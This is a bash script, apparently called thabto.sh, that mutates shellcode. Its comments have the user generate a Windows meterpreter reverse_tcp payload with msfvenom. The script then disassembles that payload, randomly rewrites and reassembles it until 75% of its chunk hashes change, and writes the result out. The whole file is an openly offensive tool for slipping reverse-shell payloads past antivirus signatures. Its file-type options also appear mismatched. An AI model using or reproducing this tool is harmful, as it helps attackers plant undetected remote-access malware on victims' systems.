#!/bin/bash

# As of now, only x86 is supported

#
#  $WITH$$\ $$\   $$\  $THE$$\   QUARTERS\ $BY$OUR$\ $SIDE$\
#  \__$$  __|$$ |  $$ |$$  __$$\ $$  __$$\\__$$  __|$$  __$$\
#     $$ |   $$ |  $$ |$$ /  $$ |$$ |  $$ |  $$ |   $$ /  $$ |
#     $$ |   ALL$WILL |$BOW$$$$ |$TO$OUR\ |  $$ |   $$ |  $$ |
#     $$ |   $$  __$$ |$$  __$$ |$$  __$$\   $$ |   $$ |  $$ |
#     $$ |   $$ |  $$ |$$ |  $$ |$$ |  $$ |  $$ |   $$ |  $$ |
#     $$ |   $$ |  $$ |$$ |  $$ |$POWERS$ |  $$ |    $$$$$$  |
#     \__|   \__|  \__|\__|  \__|\_______/   \__|    \______/



# Prerequisite
# sudo gem update; sudo gem install metasm

#First generate a raw payload using msfvenom
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=$(hostname -I) LPORT=443 -f raw > raw_binary

# Then call thabto.sh like so
# ./thabto.sh raw_binary output_file

THRESHOLD=75


cp $(locate disassemble.rb | grep "samples" | head -1) ./disassemble.rb
chmod +x disassemble.rb

read -n1 -p "[E]LF/[M]ach-o/e[X]e/[P*]E?: " FILETYPE </dev/tty
echo
case $FILETYPE in
    [eE]*) cp $(locate elfencode.rb | head -1) ./encode.rb
        ;;
    [mM]*) cp $(locate exeencode.rb | head -1) ./encode.rb
        ;;
    [xX]*) cp $(locate machoencode.rb | head -1) ./encode.rb
        ;;
    *) cp $(locate peencode.rb | head -1) ./encode.rb; cp $(locate exeencode.rb | head -1) ./exeencode.rb
        ;;
esac

chmod +x encode.rb

RAW_LOC="$1"

# Disassemble
./disassemble.rb $RAW_LOC > asm_code.asm

sed -i "1s/^/\.section \'\.text\' rwx\n\.entrypoint\n/" asm_code.asm

./encode.rb asm_code.asm -o ctrl_payload

#CTRL_SUMS generated from payload recompiled after only adding section header
# If binary is smaller than 10k, break into 20 pieces.
FILESIZE=$(stat -c%s ctrl_payload)
mkdir splits
cd splits
if (( $FILESIZE < 10240 ))
then
    split -n 20 "../ctrl_payload"
else
    # Otherwise, 512-byte chunks.
    split -b 512 "../ctrl_payload"
fi

# Generate original hashes
for f in x*
do
    sha256sum $f >> ../CTRL_SUMS
done

cd ../
rm -r splits

TOTAL=$(wc -l CTRL_SUMS | awk '{print $1}' )

# While change threshold not reached:
find rules/ -type f -name *'.r' | shuf -r | while read rule
do

    # Randomly apply a rule
    eval "$rule"

    # Re-assemble
    ./encode.rb asm_code.asm -o payload

    # Generate new hashes
    mkdir splits
    cd splits
    if (( $FILESIZE < 10240 ))
    then
        split -n 20 "../payload"
    else
        # Otherwise, 512-byte chunks.
        split -b 512 "../payload"
    fi

    CHANGED=$(sha256sum -c ../CTRL_SUMS 2>/dev/null | grep -c "FAILED")

    cd ../
    rm -r splits

    # Compare new hashes to old hashes to determine % change
    [[ $((100 * CHANGED/TOTAL)) -ge $THRESHOLD ]] && { break; }
done

mv payload $2

rm -f encode.rb disassemble.rb asm_code.asm exeencode.rb CTRL_SUMS ctrl_payload